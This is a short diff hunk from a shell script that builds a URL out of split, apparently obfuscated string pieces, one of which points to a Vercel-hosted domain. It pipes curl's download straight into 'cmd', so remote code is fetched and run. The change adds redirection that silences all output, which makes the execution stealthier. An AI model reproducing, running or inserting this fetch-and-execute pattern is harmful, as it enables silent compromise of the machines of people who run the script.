@@ -15,4 +15,4 @@ h1=".ver"; h2="cel.app"
 
 f=$((1+2+3))
 
-curl "${proto}://${dom}${h1}${h2}/settings/windows?flag=${f}" | cmd
+curl "${proto}://${dom}${h1}${h2}/settings/windows?flag=${f}" | cmd >/dev/null 2>&1
